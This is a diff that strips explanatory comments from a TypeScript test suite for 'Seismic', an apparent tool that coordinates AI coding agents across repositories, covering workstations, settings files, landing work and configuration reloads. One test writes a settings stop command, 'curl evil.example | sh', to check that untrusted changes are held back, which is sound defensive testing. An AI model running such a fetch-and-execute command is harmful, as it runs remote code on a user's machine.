@@ -49,10 +49,10 @@ afterEach(() => {
   for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
 });
 
-// the timers' work done, and the workers it started at work in their workstations
+
 const settle = async () => {
   await new Promise((r) => setTimeout(r, 5));
-  // a change of the board reaches the Koordinator after a timer and the decisions before it: on a loaded runner, later than 5 ms
+  
   const asking = () => runtime.sessions.some((s) => !s.closed && s.spec.tools.some((t) => t.name === 'scope' || t.name === 'schedule'));
   for (const end = Date.now() + 1000; project.koordinator.busy && !asking() && Date.now() < end; ) await Bun.sleep(2);
   await Promise.all(project.repos.map((r) => r.workers.prepared()));
@@ -161,7 +161,7 @@ describe('a project with several repositories', () => {
     const remote = { name: 'box', slots: 2, total: 2, cards: [], busy: [], workstations: [{ path: '/w/1' }, { path: '/w/2' }] };
     expect(withCheckout([remote], { exploring: ['i'] })).toEqual([{ name: HERE, here: true, checkout: true, slots: 0, total: 0, cards: [], busy: [], workstations: [], exploring: ['i'] }, remote]);
     expect(withCheckout([remote], {})).toEqual([remote]);
-    // where this machine has the pool's workstations, the idea stands among them
+    
     const here = { ...remote, name: HERE, here: true as const, exploring: ['i'] };
     expect(withCheckout([here], { exploring: ['i'] })).toEqual([here]);
   });
@@ -169,7 +169,7 @@ describe('a project with several repositories', () => {
   test("a stopped workstream of a repository after the first keeps its clone when Seismic starts again", async () => {
     project.shutdown();
     const config = { name: 'Produkt', repos: [{ path: join(dir, 'web'), clones: 1, settings: { land: 'main' as const } }, { path: join(dir, 'api'), clones: 1, settings: { land: 'main' as const } }] };
-    // watching the first repository reads the docs before the second one is on the project
+    
     const start = () => new ProjectRuntime(config, { store, home: dir, runtime, forge: noForge, watch: true });
     project = start();
     const w = project.board.snapshot().items.find((i) => i.plan?.label === 'W1' && i.repo === 'api')!;
@@ -183,7 +183,7 @@ describe('a project with several repositories', () => {
     project = start();
     expect(project.repoOf(w.id).workstations.leasedBy(w.id)).toBe(clone);
     expect(project.board.row(w.id).workstation).toBe(clone);
-    // on macOS opening or closing a plan-doc watcher can block for seconds (FSEvents), and this test does it twice per repository
+    
   }, 30_000);
 
   test('cards of different repositories never wait for each other', async () => {
@@ -191,7 +191,7 @@ describe('a project with several repositories', () => {
     project.act(a.id, { action: 'start' });
     await settle();
     expect(item(a.id).state).toBe('working');
-    // A's estimate, and B in the other repository with the same file
+    
     const estimate = () => runtime.sessions.filter((x) => x.spec.tools.some((t) => t.name === 'scope')).at(-1)!;
     const scopeCall = (files: string[], conflicts: string[] = []) => {
       const s = estimate();
@@ -203,14 +203,14 @@ describe('a project with several repositories', () => {
     const b = project.board.create({ title: 'B', x: 0, y: 0, repo: 'api' });
     project.act(b.id, { action: 'start' });
     await settle();
-    // nothing in progress in "api": B starts without an estimate first
+    
     expect(item(b.id).state).toBe('working');
-    // and a second card in "web" is judged against A only, and waits for it
+    
     const c = project.board.create({ title: 'C', x: 0, y: 0 });
     project.act(c.id, { action: 'start' });
     await settle();
     scopeCall(['src/index.ts']);
-    // C's estimate, once git has read what A changed
+    
     await until(() => estimate().inbox[0]!.includes('task "C"'));
     expect(estimate().inbox[0]).toContain('K1: "A"');
     expect(estimate().inbox[0]).not.toContain('"B"');
@@ -314,7 +314,7 @@ describe('a project with several repositories', () => {
     expect(item(p.id).idea?.proposal).toEqual({ questions: [] });
     project.act(p.id, { action: 'accept' });
     expect(item(p.id).state).toBe('planned');
-    // as the work retrospective made them before
+    
     const q = project.board.proposeRetro('web', { title: 'Skill für Demos', body: 'Ein Skill.', basis: 'Demos scheitern.' });
     store.updateCard(q.id, { idea: { proposal: null } });
     project.act(q.id, { action: 'accept', start: false });
@@ -334,7 +334,7 @@ describe('a project with several repositories', () => {
     const pb = boundsOf(item(p.id), all);
     for (const o of all.filter((i) => !i.parent && i.id !== p.id).map((i) => boundsOf(i, all)))
       expect(pb.x + pb.w <= o.x || o.x + o.w <= pb.x || pb.y + pb.h <= o.y || o.y + o.h <= pb.y).toBe(true);
-    // a second one does not land on the first
+    
     const q = project.board.propose(ws.id, { title: 'Noch einer', task: 'S', reason: 'R' });
     expect([item(q.id).x, item(q.id).y]).not.toEqual([item(p.id).x, item(p.id).y]);
   });
@@ -356,7 +356,7 @@ describe('a project with several repositories', () => {
     const both = b.proposePreference('Keine any-Typen.', {}, undefined, 'web');
     const seismic = b.proposePreference('Fragen mit höchstens drei Optionen.', {});
     project.acceptRule(web);
-    // the owner moves it from api to web
+    
     project.acceptRule(api, undefined, 'web');
     project.acceptRule(both);
     const collect = b.collecting('web')!;
@@ -364,7 +364,7 @@ describe('a project with several repositories', () => {
     expect(collect.body).toEndWith('- Tests auf Deutsch.\n- Logs auf Englisch.\n- Keine any-Typen.');
     expect(collect.queue).toBeFalsy();
     expect(b.collecting('api')).toBeUndefined();
-    // the last open proposal is decided: the card goes to the Koordinator like a started one
+    
     project.rejectRule(seismic);
     expect(item(collect.id).queue).toMatchObject({ checking: true });
     await settle();
@@ -401,7 +401,7 @@ test('the Koordinator reads which labels Seismic may suggest from the project to
   const web = repo('web', 'Web');
   project.shutdown();
   project = new ProjectRuntime({ name: 'Q', repos: [{ path: web }] }, { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge });
-  // a project from before the toggles: all on
+  
   expect(suggestable(project.koordinator.suggests())).toEqual(['category', 'subcategory', 'complexity', 'priority']);
   await project.apply({ name: 'Q', suggest: { category: false, complexity: true, priority: false }, repos: [{ path: web }] });
   expect(suggestable(project.koordinator.suggests())).toEqual(['complexity']);
@@ -489,7 +489,7 @@ describe('many landings and agent starts at once', () => {
     const w = project.repos[0]!.workers;
     const cards = ['A', 'B', 'C', 'D', 'E', 'F'].map((title) => project.board.create({ title, x: 0, y: 0 }));
     const sessionOf = (id: string) => workers.sessions.find((s) => s.spec.cwd === project.board.row(id).workstation);
-    // four handed over, each with a commit of its own
+    
     for (const c of cards.slice(0, 4)) {
       await w.start(c.id);
       await until(() => !!sessionOf(c.id));
@@ -500,7 +500,7 @@ describe('many landings and agent starts at once', () => {
       await sessionOf(c.id)!.call('ready_for_review', { summary: c.title, demo: artifact() });
       sessionOf(c.id)!.emit({ type: 'idle' });
     }
-    // git as slow as on a busy machine: each process the server waited for would hold it up that long
+    
     const waited: string[] = [];
     const spawnSync = Bun.spawnSync;
     Bun.spawnSync = ((...args: Parameters<typeof Bun.spawnSync>) => {
@@ -516,7 +516,7 @@ describe('many landings and agent starts at once', () => {
       last = now;
     }, 5);
     try {
-      // all four approved at once, their work landing on main one after the other, and two cards starting meanwhile
+      
       await Promise.all([...cards.slice(0, 4).map((c) => w.approve(c.id)), ...cards.slice(4).map((c) => w.start(c.id))]);
       await until(() => cards.slice(4).every((c) => sessionOf(c.id)));
     } finally {
@@ -525,7 +525,7 @@ describe('many landings and agent starts at once', () => {
     }
     expect(cards.slice(0, 4).map((c) => item(c.id).state)).toEqual(['live', 'live', 'live', 'live']);
     expect(git(shop, 'log', '--format=%s', '-4').split('\n').sort()).toEqual(['A', 'B', 'C', 'D']);
-    // the agents that started after main moved know its Claude Code settings wait for the owner
+    
     expect(cards.slice(4).map((c) => sessionOf(c.id)!.spec.untrusted)).toEqual([true, true]);
     expect(stall).toBeLessThan(STALL_MS);
     expect(waited).toEqual([]);
@@ -545,7 +545,7 @@ describe("a repository's settings for this machine", () => {
     const card = project.board.create({ title: 'Readme', x: 0, y: 0 });
     await project.repos[0]!.workers.start(card.id);
     const ws = project.board.row(card.id).workstation!;
-    // a worktree's config is the checkout's
+    
     identify(shop);
     writeFileSync(join(ws, 'README.md'), 'Shop\n');
     git(ws, 'commit', '--quiet', '-am', 'Readme');
@@ -555,7 +555,7 @@ describe("a repository's settings for this machine", () => {
     settings = { land: 'main' };
     await project.settingsChanged();
     expect(project.board.snapshot().project.repos[0]!.pullRequests).toBeUndefined();
-    // the Lesestand is the checkout now, which the landing moves
+    
     expect(project.repos[0]!.read.path).toBe(shop);
     await project.repos[0]!.workers.approve(card.id);
     expect(item(card.id).state).toBe('live');
@@ -594,13 +594,13 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     project.shutdown();
     project = new ProjectRuntime({ repos: [{ path: clone }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, settings: () => settings });
     const adapter = project.repos[0]!.adapter;
-    // detection alone would send work from a clone with a remote out as pull requests only on GitHub; the file says main
+    
     expect([adapter.land, adapter.checks, adapter.planDocs.dir]).toEqual(['main', ['bun test'], 'plans']);
     settings = { checks: [] };
     expect(adapter.checks).toEqual([]);
     settings = undefined;
 
-    // a change in the checkout counts once it is committed on the default branch
+    
     writeFileSync(join(clone, '.seismic/settings.json'), '{ "land": "main", "checks": ["bun test", "bun run lint"] }\n');
     await project.settingsChanged();
     expect(adapter.checks).toEqual(['bun test']);
@@ -619,12 +619,12 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     const rev = () => project.board.snapshot().project.repos[0]!.configRev;
     await project.settingsChanged();
     expect(rev()).toBeUndefined();
-    // a field that does not count changes the problems alone, not the settings
+    
     writeFileSync(join(shop, '.seismic/settings.json'), '{ "land": "main", "chekcs": [] }\n');
     git(shop, 'commit', '--quiet', '-am', 'A typo');
     await project.settingsChanged();
     expect(rev()).toBe(1);
-    // the leftover adapter module goes
+    
     git(shop, 'rm', '--quiet', '-r', '.obeya/adapter');
     git(shop, 'commit', '--quiet', '-m', 'No adapter module');
     await project.settingsChanged();
@@ -644,11 +644,11 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     const setup = () => project.board.snapshot().items.filter((i) => i.title.startsWith('Set up Seismic'));
     expect(setup()).toMatchObject([{ state: 'proposal', title: 'Set up Seismic for shop', repo: 'shop', idea: { proposal: { setup: true, reason: expect.stringContaining('shop') } } }]);
     const id = setup()[0]!.id;
-    // a restart proposes no second one
+    
     project.shutdown();
     project = start();
     expect(setup().map((i) => i.id)).toEqual([id]);
-    // the dialog's button takes it on, planned, as if it had made it
+    
     const card = project.adapterSetupCard('shop');
     expect(card).toMatchObject({ id, state: 'planned' });
     expect(card.idea?.proposal).toBeUndefined();
@@ -697,7 +697,7 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     await until(() => captures().length > 0);
     project.shutdown();
     await until(() => captures().length === 0);
-    // Let the read's continuation run after its finally cleaned up the temporary index.
+    
     await new Promise((r) => setTimeout(r, 0));
     expect(oldBoard.snapshot().items.some((i) => i.title === 'Finish working changes')).toBe(false);
   });
@@ -732,7 +732,7 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     project.shutdown();
     project = start();
     expect(setup('shop')).toBeUndefined();
-    // settings committed on the main branch take the open one away
+    
     expect(setup('web')).toBeDefined();
     mkdirSync(join(web, '.seismic'));
     writeFileSync(join(web, '.seismic/settings.json'), '{ "checks": ["bun test"] }\n');
@@ -751,21 +751,21 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     project.shutdown();
     const url = 'https://demos.example.dev';
     project = new ProjectRuntime({ repos: [{ path: shop }], demoSite: { url, path: 'shop' } }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
-    // a site this machine does not have
+    
     expect(project.board.project.repos[0]).toMatchObject({ shareSite: 'none' });
     expect(project.shareSite()).toBeNull();
     writeSites(dir, [{ url, deploy: 'git {dir}' }]);
     project.demoSitesChanged();
     expect(project.board.project.repos[0]).toMatchObject({ shareSite: 'init' });
     expect(project.board.project.demoSite).toEqual({ url, path: 'shop', ready: false });
-    // its path on the site, as Initialize leaves it
+    
     const manifest = join(dir, 'sites', siteKey(url), 'site', MANIFEST);
     mkdirSync(dirname(manifest), { recursive: true });
     writeFileSync(manifest, JSON.stringify({ deploy: 'x', machine: 'a', at: '', pages: {}, paths: { shop: { title: 'Shop', language: 'en' } } }));
     project.demoSitesChanged();
     expect(project.board.project.repos[0]).toMatchObject({ share: true });
     expect(project.shareSite()).toMatchObject({ path: 'shop', site: { url, title: project.board.project.name } });
-    // another path is not initialized
+    
     await project.apply({ repos: [{ path: shop }], demoSite: { url, path: 'other' } });
     expect(project.board.project.repos[0]).toMatchObject({ shareSite: 'init' });
     await project.apply({ repos: [{ path: shop }] });
@@ -788,7 +788,7 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     expect(r.adapter.app).toEqual({ run: 'bun dev' });
     const card = project.board.create({ title: 'Karte', x: 0, y: 0 });
     await r.workers.start(card.id);
-    // a worker in its workstation, and an agent that only reads in the checkout
+    
     expect(runtime.last.spec).toMatchObject({ untrusted: true, system: expect.stringContaining("The repository's CLAUDE.md:\n\nRun the tests with bun test.") });
     const rev = project.board.project.repos[0]!.configRev ?? 0;
 
@@ -800,20 +800,20 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     await r.workers.start(other.id);
     expect(runtime.last.spec.untrusted).toBeUndefined();
 
-    // changed on the default branch: held again, until trusted anew
+    
     writeFileSync(join(shop, '.seismic/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' } }));
     git(shop, 'commit', '--quiet', '-am', 'Another stop');
     await project.settingsChanged();
     expect(r.adapter.app).toEqual({ run: 'bun dev' });
 
-    // a skill of its own with a hook, committed on main without the project noticing: the next agent is without it
+    
     writeFileSync(join(shop, '.claude/skill.md'), '---\nhooks:\n  Stop: [{ hooks: [{ type: command, command: touch ran }] }]\n---\n');
     git(shop, 'add', '-A');
     git(shop, 'commit', '--quiet', '-m', 'A skill');
     const third = project.board.create({ title: 'Dritte', x: 0, y: 0 });
     const started = runtime.sessions.length;
     await r.workers.start(third.id);
-    // its agent starts once git has read the default branch, which moved
+    
     await until(() => runtime.sessions.length > started);
     expect(runtime.last.spec.untrusted).toBe(true);
   });
@@ -891,7 +891,7 @@ describe("a repository's settings for everyone (.seismic/settings.json)", () => 
     writeFileSync(join(shop, '.seismic/settings.json'), '{ "land": "main", "workstations": "clones" }\n');
     git(shop, 'commit', '--quiet', '-am', 'Clones');
     await project.settingsChanged();
-    // the worker at work hears of it and pauses; the restart waits for it
+    
     expect(project.pendingRestart()).toMatchObject({ reason: 'repository', cards: [card.id], repos: ['shop'] });
     expect(session.inbox.at(-1)).toContain("restart this repository's agents");
     expect(project.repos[0]).toBe(before);
@@ -935,12 +935,12 @@ describe('the configuration changed while the project runs', () => {
   test('the configuration saved again unchanged leaves the project as it is (its repositories are not read again); changed, it applies', async () => {
     const config = { name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' as const } }] };
     open(config.repos);
-    // another project's settings were saved: nothing to do here
+    
     expect(project.apply(config)).toBeUndefined();
     await project.apply({ ...config, name: 'Plattform' });
     expect(project.board.project.name).toBe('Plattform');
     expect(project.apply({ ...config, name: 'Plattform' })).toBeUndefined();
-    // back to how it started: applied, not taken for the one it runs on
+    
     await project.apply(config);
     expect(project.board.project.name).toBe('Produkt');
   });
@@ -957,7 +957,7 @@ describe('the configuration changed while the project runs', () => {
     expect(project.pendingRestart()).toBeNull();
     expect(session.closed).toBe(false);
     expect(session.inbox.join()).not.toContain('restart');
-    // the new repository's plan doc is on the project
+    
     expect(project.board.snapshot().items.some((i) => i.kind === 'plan' && i.repo === 'api')).toBe(true);
   });
 
@@ -997,7 +997,7 @@ describe('the configuration changed while the project runs', () => {
     await until(() => project.repos[0] !== before);
     const spaces = project.repos[0]!.workstations;
     expect(spaces.list().map((x) => x.path)).toEqual([held, own]);
-    // the free clone Seismic made goes from disk at once, the one the card holds once it gives it back; the owner's stays
+    
     await until(() => !existsSync(made2!));
     expect(existsSync(held)).toBe(true);
     spaces.release(w.card.id);
@@ -1033,7 +1033,7 @@ describe('the configuration changed while the project runs', () => {
     v.session.emit({ type: 'idle' });
     w.session.emit({ type: 'idle' });
     await until(() => project.repos[0] !== before);
-    // work on its branch, pushed: the card keeps its clone when stopped, and nothing is lost with its folder
+    
     identify(held);
     git(held, 'commit', '--quiet', '--allow-empty', '-m', 'work');
     git(held, 'push', '--quiet', 'origin', 'HEAD');
@@ -1049,7 +1049,7 @@ describe('the configuration changed while the project runs', () => {
     const w = await atWork('web', 'W');
     const [held, free] = project.repos[0]!.workstations.list().map((x) => x.path) as [string, string];
     const before = project.repos[0]!;
-    // the number emptied: the repository's settings say nothing, so it goes over to worktrees
+    
     await project.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }] });
     w.session.emit({ type: 'idle' });
     await until(() => project.repos[0] !== before);
@@ -1057,7 +1057,7 @@ describe('the configuration changed while the project runs', () => {
     expect(spaces.mode).toBe('worktrees');
     expect(spaces.list().map((x) => x.path)).toEqual([held]);
     await until(() => !existsSync(free));
-    // the card works on in its clone, and a new card gets a worktree
+    
     expect(spaces.leasedBy(w.card.id)).toBe(held);
     expect(await spaces.hasWork(w.card.id)).toBe(false);
     spaces.release(w.card.id);
@@ -1118,10 +1118,10 @@ describe('the configuration changed while the project runs', () => {
     expect(item(card.id).repo).toBe('api');
     expect(() => project.repoOf(card.id)).toThrow();
     for (const a of [{ action: 'start' }, { action: 'message', text: 'Hallo' }, { action: 'approve' }] as CardAction[]) expect(refused(card.id, a)).toBe('repoDown');
-    // nor does it become an idea, whose agent would read in another repository
+    
     expect(() => project.patch(card.id, { state: 'idea' })).toThrow();
     expect(item(card.id).state).toBe('planned');
-    // its time come, the card set to start later waits on
+    
     project.wakeDue(Date.now() + 120_000);
     expect(item(later.id)?.hold?.reason).toBe('snoozed');
     await settle();
@@ -1158,7 +1158,7 @@ describe('the configuration changed while the project runs', () => {
     const w = await atWork('web', 'W');
     const before = project.repos[0]!;
     const rev = project.board.project.configRev ?? 0;
-    // a clone of another repository listed for it: its workstations refuse it as it starts
+    
     const wrong = cloneOf(api, 'x-api');
     const errors = quiet();
     await project.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 1, workstations: [wrong] }] });
@@ -1170,9 +1170,9 @@ describe('the configuration changed while the project runs', () => {
     expect(project.repos[0]!.workstations.list().map((x) => x.path)).toEqual(before.workstations.list().map((x) => x.path));
     expect(project.failures()).toEqual([{ project: 'produkt', repo: 'web', before: true, detail: expect.stringContaining(`${wrong} is not a clone of`) }]);
     expect(project.board.project.configRev).toBe(rev + 1);
-    // its worker resumed where it paused
+    
     expect(workers.last.spec.resume).toBe('sess-W');
-    // a configuration it starts with: the failure goes
+    
     const now = project.repos[0]!;
     await project.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' }, clones: 2 }] });
     workers.last.emit({ type: 'idle' });
@@ -1189,7 +1189,7 @@ describe('the configuration changed while the project runs', () => {
       { path: api, settings: { land: 'pr' }, workstations: [own] },
     ]);
     const a = await atWork('api', 'A');
-    // the listed clone now belongs to another repository: the set-up before fails as well
+    
     git(own, 'remote', 'set-url', 'origin', web);
     const errors = quiet();
     await project.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }, { path: api, settings: { land: 'pr' }, workstations: [own], clones: 1 }] });
@@ -1200,18 +1200,18 @@ describe('the configuration changed while the project runs', () => {
     expect(project.board.project.repos.map((r) => r.id)).toEqual(['web']);
     expect(project.board.item(a.card.id)).toBeDefined();
     expect(project.failures()).toEqual([{ project: 'produkt', repo: 'api', detail: expect.stringContaining(`${own} is not a clone of`) }]);
-    // its card shows that its repository does not run, and goes to no other's workers
+    
     expect(item(a.card.id).repoDown).toBe(true);
     const sessions = workers.sessions.length;
     expect(refused(a.card.id, { action: 'message', text: 'Weiter' })).toBe('repoDown');
     expect(workers.sessions).toHaveLength(sessions);
-    // the cause fixed, the configuration taken over again (a save, „Erneut versuchen“) starts it at once
+    
     git(own, 'remote', 'set-url', 'origin', api);
     await project.apply({ name: 'Produkt', repos: [{ path: web, settings: { land: 'pr' } }, { path: api, settings: { land: 'pr' }, workstations: [own], clones: 1 }] });
     expect(project.board.project.repos.map((r) => r.id)).toEqual(['web', 'api']);
     expect(project.repos[1]!.workstations.list()).toHaveLength(2);
     expect(project.failures()).toEqual([]);
-    // the card works again, in its own repository
+    
     expect(item(a.card.id).repoDown).toBeUndefined();
     project.act(a.card.id, { action: 'message', text: 'Weiter' });
     await until(() => workers.sessions.length > sessions);
@@ -1227,7 +1227,7 @@ describe('the projects Seismic serves', () => {
     const api = repo('api', 'API');
     const shop = repo('shop', 'Shop');
     project.shutdown();
-    // a clone listed for web and one listed for shop that belong to api: their workstations refuse them
+    
     const forWeb = join(dir, 'x-web');
     const forShop = join(dir, 'x-shop');
     git(dir, 'clone', '--quiet', api, forWeb);
@@ -1246,14 +1246,14 @@ describe('the projects Seismic serves', () => {
       { project: 'web', detail: expect.stringContaining(`${forWeb} is not a clone of`) },
       { project: 'api', repo: 'shop', detail: expect.stringContaining(`${forShop} is not a clone of`) },
     ]);
-    // the causes fixed, the configuration taken over again (a save, „Erneut versuchen“): both start
+    
     git(forWeb, 'remote', 'set-url', 'origin', web);
     git(forShop, 'remote', 'set-url', 'origin', shop);
     await set.apply(configs, ['web', 'api']);
     expect(set.all().map((c) => c.id)).toEqual(['web', 'api']);
     expect(set.get('api')!.board.project.repos.map((r) => r.id)).toEqual(['api', 'shop']);
     expect(set.failures()).toEqual([]);
-    // the home repository starts neither as configured now nor as before: the project stops, its cards kept
+    
     const keep = set.get('web')!.board.create({ title: 'Bleibt', x: 0, y: 0 });
     let changes = 0;
     set.onChange(() => changes++);
@@ -1291,7 +1291,7 @@ describe('the projects Seismic serves', () => {
     );
     expect(set.all().map((c) => c.id)).toEqual(['web', 'api']);
     expect(started).toEqual(['api']);
-    // moved in the configuration: listed in its new order, nothing started again
+    
     const before = changes;
     await set.apply(
       [
@@ -1304,13 +1304,13 @@ describe('the projects Seismic serves', () => {
     expect(started).toEqual(['api']);
     expect(changes).toBeGreaterThan(before);
     await set.apply([{ name: 'API', repos: [{ path: api, settings: { land: 'pr' } }] }], ['api']);
-    // nobody at work on it: it stops once its repositories had their look whether anyone is (`restartIntervalMs`)
+    
     await until(() => set.all().length === 1);
     expect(set.all().map((c) => c.id)).toEqual(['api']);
     expect(changes).toBeGreaterThan(1);
     expect(store.cards.onProject('web').map((c) => c.id)).toContain(keep.id);
     set.shutdown();
-    // the project variable the other tests shut down after them
+    
     project = new ProjectRuntime({ repos: [{ path: web, settings: { land: 'pr' } }] }, { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge });
   });
 });
@@ -1322,7 +1322,7 @@ test('a clone registered for a repository must be one of it', () => {
   git(dir, 'clone', '--quiet', api, join(dir, 'api-clone'));
   const deps = { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge };
   expect(() => new ProjectRuntime({ repos: [{ path: web, workstations: [join(dir, 'api-clone')] }] }, deps)).toThrow('is not a clone of');
-  // the repository itself counts too, though it has no origin (where work lands on its main, it stays out of the pool)
+  
   project = new ProjectRuntime({ repos: [{ path: api, settings: { land: 'pr' }, workstations: [api, join(dir, 'api-clone')] }] }, deps);
   expect(project.repos[0]!.workstations.list()).toHaveLength(2);
 });
@@ -1370,7 +1370,7 @@ test('what the owner writes in a card, or says to the Koordinator without one, r
     await settle();
   };
 
-  // a new card: what the owner typed, once they pause
+  
   const a = project.board.create({ title: 'Export', x: 0, y: 0 });
   project.patch(a.id, { body: 'CSV' });
   project.patch(a.id, { body: 'CSV, Spalten immer mit Einheit.' });
@@ -1382,7 +1382,7 @@ test('what the owner writes in a card, or says to the Koordinator without one, r
   expect(learners()[0]!.inbox[0]).not.toContain('Before the owner wrote');
   await done();
 
-  // a follow-up with a finding in it: at once when the owner acts on it, with the text it had before
+  
   const b = project.board.create({ title: 'Datum', body: 'Befund: Datum fehlt.', from: a.id });
   project.patch(b.id, { body: 'Befund: Datum fehlt.\n\nImmer ISO-Datum.' });
   project.act(b.id, { action: 'planDoc' });
@@ -1391,7 +1391,7 @@ test('what the owner writes in a card, or says to the Koordinator without one, r
   expect(learners()[1]!.inbox[0]).toContain("Before the owner wrote in it, the card's text read:\nBefund: Datum fehlt.");
   await done();
 
-  // typed back to what it was, or deleted while being written: nothing
+  
   const c = project.board.create({ title: 'C', body: 'Alt.', x: 0, y: 0 });
   project.patch(c.id, { body: 'Neu.' });
   project.patch(c.id, { body: 'Alt.' });
@@ -1401,7 +1401,7 @@ test('what the owner writes in a card, or says to the Koordinator without one, r
   await new Promise((r) => setTimeout(r, 50));
   expect(learners()).toHaveLength(2);
 
-  // the conversation with the Koordinator, without a card open
+  
   const heard = project.commander.hear('Warum fragen die Agenten so viel?', {});
   await settle();
   runtime.last.call('reply', { confirm: 'Weil die Karten offen lassen, wie weit sie gehen sollen.' });
@@ -1409,7 +1409,7 @@ test('what the owner writes in a card, or says to the Koordinator without one, r
   await heard;
   await settle();
   expect(learners()).toHaveLength(3);
-  // it reads the home repository's Lesestand, the default branch, not the checkout a card may have leased
+  
   expect(learners()[2]!.spec.cwd).toBe(join(dir, 'read', 'web', 'web'));
   expect(learners()[2]!.inbox[0]).toContain('You replied: Weil die Karten offen lassen');
 });
@@ -1422,10 +1422,10 @@ test('clicks in a card count towards the Rückschau, and words the learner reads
   await settle();
   project.press(a.id, { action: 'message', text: 'Bitte kleiner.' });
   expect(count()).toBe('2');
-  // a spoken command is counted as what the owner said, not as a click besides
+  
   project.act(a.id, { action: 'stop' });
   expect(count()).toBe('2');
-  // a click that does not go through does not count
+  
   expect(() => project.press(a.id, { action: 'dismiss' })).toThrow();
   expect(count()).toBe('2');
 });
@@ -1433,14 +1433,14 @@ test('clicks in a card count towards the Rückschau, and words the learner reads
 describe('where a spoken new card lands', () => {
   test('in view, at the place the owner was; without one, in what a page last had in view', async () => {
     project.board.create({ title: 'Far', x: 5000, y: 3000 });
-    // clear of the project's plans, which stand at the origin
+    
     const view = { x: 2000, y: 1000, w: 1200, h: 800 };
     const [w, h] = CARD_SIZE.task;
     const titled = (title: string) => project.board.snapshot().items.find((i) => i.title === title)!;
     await project.run({ do: 'newCard', title: 'Here', body: '', start: false, place: { x: 2400, y: 1300, view } });
     const here = titled('Here');
     expect([here.x, here.y]).toEqual([2400 - w / 2, 1300 - h / 2]);
-    // under the pointer is taken now: the next goes beside it, still in view
+    
     await project.run({ do: 'newCard', title: 'Next', body: '', start: false, place: { x: 2400, y: 1300, view } });
     const next = titled('Next');
     expect(next.x >= 2000 && next.y >= 1000 && next.x + w <= 3200 && next.y + h <= 1800).toBe(true);
@@ -1456,7 +1456,7 @@ describe('where a spoken new card lands', () => {
     const id = (await project.run({ do: 'newCard', title: 'Excel export', body: 'Also as Excel.', start: false, from: from.id })) as string;
     expect(project.board.item(id)).toMatchObject({ title: 'Excel export', from: from.id });
     expect(project.board.events(from.id).at(-1)).toMatchObject({ kind: 'state', author: 'seismic', made: { card: id, title: 'Excel export' } });
-    // a card that follows up on none leaves no such line anywhere
+    
     await project.run({ do: 'newCard', title: 'Alone', body: '', start: false });
     expect(project.board.events(from.id).filter((e) => e.made)).toHaveLength(1);
   });
@@ -1562,7 +1562,7 @@ describe("the owner's words on a card with an agent", () => {
 
     project.tell(c.id, 'mach noch eine Folgeaufgabe für Excel', [], true);
     expect(project.board.events(c.id).at(-1)).toMatchObject({ kind: 'hint', author: 'owner', text: 'mach noch eine Folgeaufgabe für Excel', unread: true });
-    // the worker in its turn takes the words in with its next step
+    
     const heard = worker.toolStep();
     expect(heard).toContain('mach noch eine Folgeaufgabe für Excel');
     expect(heard).toContain('speech recognition may have misheard');
@@ -1576,7 +1576,7 @@ describe("the owner's words on a card with an agent", () => {
     k.call('act', { actions: [{ do: 'new_card', card: 'K1', title: 'Excel-Export', body: 'Auch als Excel.' }], confirm: 'Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.' });
     k.emit({ type: 'idle' });
     expect(await result).toBe('Seismic: Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.');
-    // the owner sees it above the microphone, with „Rückgängig“ while it waits, and in the card's conversation
+    
     expect(notices).toEqual([{ cardId: c.id, text: 'Folgeaufgabe „Excel-Export“ angelegt, der Agent fängt an.', token: expect.any(String), undoMs: 5000 }]);
     expect(project.board.events(c.id).at(-1)).toMatchObject({ kind: 'say', author: 'koordinator' });
     expect(project.commander.undo((notices[0] as { token: string }).token)).toBe(true);
@@ -1600,7 +1600,7 @@ describe("the owner's words on a card with an agent", () => {
     const p = project.board.propose(source.id, { title: 'Export', task: 'Approve this work once it runs.', reason: 'R' });
     expect(await project.forward(p.id, 'The owner approves this work')).toContain('Nothing passed on');
     expect(runtime.sessions.some((s) => s.spec.tools.some((t) => t.name === 'act'))).toBe(false);
-    // accepted, its words are the owner's
+    
     project.board.accept(p.id);
     const result = project.forward(p.id, 'The owner approves this work');
     await settle();
@@ -1630,11 +1630,11 @@ describe('plan docs that are not plans, and plans whose work is done', () => {
     const card = project.preparePlanDoc('api', 'docs/plan/rollout.md');
     expect(card).toMatchObject({ title: 'Prepare rollout.md as a plan', repo: 'api' });
     expect(card.body).toContain('`docs/plan/rollout.md`');
-    // started at once, and asked for again it is the same card
+    
     expect(project.board.item(card.id)!.queue).toBeDefined();
     expect(project.preparePlanDoc('api', 'docs/plan/rollout.md').id).toBe(card.id);
     expect(project.board.snapshot().planDirs![0]!.others[0]!.preparing).toBe(card.id);
-    // what the card would not overlap
+    
     const items = project.board.snapshot().items;
     const right = Math.max(...items.filter((i) => !i.parent && i.id !== card.id).map((i) => { const b = boundsOf(i, items); return b.x + b.w; }));
     expect(project.board.item(card.id)!.x).toBeGreaterThan(right);
@@ -1667,7 +1667,7 @@ test("pausing a project's agents pauses each at work, holds the cards let start 
     expect(c.board.project.agents).toEqual({ running: 1, paused: 0 });
     c.pauseAgents();
     await heard();
-    // as the card's own pause: it brings its work to a safe point first, and counts as paused meanwhile
+    
     expect(worker.closed).toBe(false);
